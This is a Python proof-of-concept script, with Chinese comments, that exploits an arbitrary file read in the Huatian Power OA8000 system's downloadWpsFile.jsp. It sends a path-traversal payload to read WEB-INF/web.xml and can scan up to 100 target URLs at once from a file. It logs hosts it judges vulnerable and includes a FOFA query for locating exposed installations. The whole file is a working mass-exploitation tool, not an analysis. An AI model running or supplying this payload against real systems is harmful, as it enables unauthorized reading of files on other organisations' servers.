import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """华天动力OA系统downloadWpsFile任意文件读取"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='华天动力OA系统downloadWpsFile任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml"
    headers = {
        "User-Agent":"Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15",
        "Accept-Encoding":"gzip,deflate",
    }
    try:
        response = requests.post(url=target + payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('华天动力_result.txt', 'a') as f:
                f.write(f"{target}存在任意文件读取漏洞\n")
        else:
            print(f"[-]{target}不存在任意文件读取漏洞")
    except:
        print(f"{target}可能存在任意文件读取漏洞")
if __name__ == '__main__':
    main()

# fofa语句
# app="华天动力-OA8000"